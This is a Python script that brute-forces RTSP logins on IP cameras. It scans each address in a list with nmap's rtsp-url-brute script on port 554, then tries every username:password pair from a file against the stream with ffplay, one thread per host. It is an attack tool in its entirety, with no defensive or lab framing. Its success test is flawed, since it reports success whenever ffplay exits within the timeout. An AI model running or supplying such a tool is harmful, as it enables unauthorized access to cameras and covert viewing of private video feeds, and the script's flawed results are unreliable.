import os
import subprocess
import threading

def run_nmap(ip):
    """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
    output_file = f"{ip}.txt"
    cmd = ["nmap", "--script", "rtsp-url-brute", "-p", "554", ip]
    with open(output_file, "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL, text=True)
    print(f"Nmap scan completed for {ip}, results saved in {output_file}")

def brute_force_rtsp(ip, creds_file):
    """Attempts RTSP brute-force login using ffplay and a given credentials file."""
    if not os.path.exists(creds_file):
        print(f"Credentials file {creds_file} not found!")
        return
    
    with open(creds_file, "r") as f:
        creds = [line.strip() for line in f if ":" in line]
    
    for cred in creds:
        username, password = cred.split(":", 1)
        rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
        print(f"Trying {rtsp_url}")
        try:
            subprocess.run(["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "2"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            print(f"Success: {rtsp_url}")
            return
        except subprocess.TimeoutExpired:
            print(f"Failed: {rtsp_url}")

def worker(ip, creds_file):
    run_nmap(ip)
    brute_force_rtsp(ip, creds_file)

def main(ip_list_file, creds_file):
    if not os.path.exists(ip_list_file):
        print(f"IP list file {ip_list_file} not found!")
        return
    
    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    
    threads = []
    for ip in ips:
        thread = threading.Thread(target=worker, args=(ip, creds_file))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
if __name__ == "__main__":
    ip_list = "ips.txt"  # List of IPs, one per line
    creds_list = "creds.txt"  # List of credentials in user:pass format
    main(ip_list, creds_list)
